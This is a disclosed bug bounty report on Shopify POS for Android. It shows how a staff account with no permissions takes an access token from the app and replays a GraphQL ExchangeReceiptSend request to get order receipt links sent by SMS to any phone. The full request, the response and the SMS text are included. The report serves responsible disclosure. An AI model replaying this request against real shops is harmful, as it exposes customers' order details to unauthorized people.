# STAFF "No-Permissions" on the Store can retrieve the details Order via exchangeReceiptSend

## Report Details
- **Report ID**: 917875
- **URL**: https://hackerone.com/reports/917875
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-07T11:12:56.446Z
- **Disclosed**: 2020-08-24T16:41:33.753Z

## Reporter
- **Username**: langduvnsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
I discovered a bug in an android mobile app that allowed STAFF No Permissions using Receipt Send to Mobile of any Order information in the Store.

#Steps to reproduce:
**1)** STAFF account is created and assigned "No Permissions" on a Shop by Owner/Admin
**2)** STAFF then login to shop. Notice that STAFF is not having any access to menus.
**3)** Log in to Shopify POS on Android. Access will not allow the application, but it will call /admin/api/unstable/shop.json before logging out. Now there will be an **X-Shopify-Access-Token** parameter. I use Telerik Fiddler to capture packets on the Shopify POS App.
**4)** Now STAFF triggers the below GraphQL request via a burp proxy.
```
POST https://langduvnsec.myshopify.com/admin/api/unversioned/graphql HTTP/1.1
X-Shopify-Access-Token: xxxxxxxxxxxxxxxxxxxxxxxx
user-agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M.G955NKSU1AQDC) Shopify POS 3.50.0/22606
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 456
Host: langduvnsec.myshopify.com
Connection: Keep-Alive
Accept-Encoding: gzip

{ "query": "fragment ExchangeErrorFragment on ExchangeError { __typename code field message } mutation ExchangeReceiptSend($exchangeId: ID!, $input: ExchangeReceiptSendRecipientInput!) { __typename exchangeReceiptSend(exchangeId: $exchangeId, recipient: $input) { __typename exchange { __typename id } userErrors { __typename ... ExchangeErrorFragment } } }", "variables": {"exchangeId":"gid://shopify/Exchange/605028374","input":{"phone":"+84332947000"}}}
```
**5)** Replace your Exchange_ID and Phone number to get the details order access link. Please use your country's Phone Area Code to receive messages.
#Response: ███████
```
{
  "data": {
    "__typename": "Mutation",
    "exchangeReceiptSend": {
      "__typename": "ExchangeReceiptSendPayload",
      "exchange": {
        "__typename": "Exchange",
        "id": "gid://shopify/Exchange/605028374"
      },
      "userErrors": []
    }
  },
  "extensions": {
    "cost": {
      "requestedQueryCost": 10,
      "actualQueryCost": 10,
      "throttleStatus": {
        "maximumAvailable": 300000.0,
        "currentlyAvailable": 299990,
        "restoreRate": 15000.0
      }
    }
  }
}
```
#SMS Response: ████ and ██████████
```
pVCSdKiitos, ett teit vaihdoit ostoksen kaupasta langduvnsec!  Alkuperinen tilaus:  langduvnsec.myshopify.com/26192052246/orders/8356d9c67229a59ae4634b94d514d548/authenticate?key=bbf35fac2c88bc3bd6b53cc14e2110f3 Uusi tilaus:  langduvnsec.myshopify.com/26192052246/orders/02418bf7e3604d4c5a09aba909193dc8/authenticate?key=38a448bc14b62c4cff031eb97e6ac186asfo
```

## Impact

STAFF "No-Permissions" on the Store can retrieve the details Order via exchangeReceiptSend

## Attachments
No attachments
